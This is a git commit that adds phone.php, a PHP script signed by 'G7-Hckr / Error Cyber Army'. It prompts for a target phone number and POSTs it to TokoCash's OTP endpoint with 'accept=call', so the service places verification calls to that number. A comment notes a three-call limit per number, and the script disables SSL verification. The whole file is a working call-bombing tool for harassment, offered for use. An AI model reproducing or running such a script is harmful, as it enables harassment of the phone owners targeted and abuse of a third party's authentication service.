004dd7f287dfc1026e5e6a5a6ea725afeb6e02c6
G7-Hckr <48849606+G7-Hckr@users.noreply.github.com>
2019-03-25 21:13:35 +0700

    Create phone.php

---
+++ phone.php
@@ -0,0 +1,23 @@
+<?php
+// Limit 3x Telpon Setiap Satu Nomor
+function send($phone){
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, "https://www.tokocash.com/oauth/otp");                      
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_HEADER, true);
+        curl_setopt($ch, CURLOPT_POST, 1);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=$phone&accept=call");                        $asw = curl_exec($ch);
+        curl_close($ch);
+                echo $asw."\n";
+}
+echo "[!]#########################[!]\n";
+echo "[!] G7-Hckr                 [!]\n";
+echo "[!] TEAM ; ERROR CYBER ARMY [!]\n\n";
+echo "[!]#########################[!]\n";
+echo "[~]Nomor Target            [!]\n : ";
+$nomor = trim(fgets(STDIN));
+$execute = send($nomor);
+print $execute;
+?>
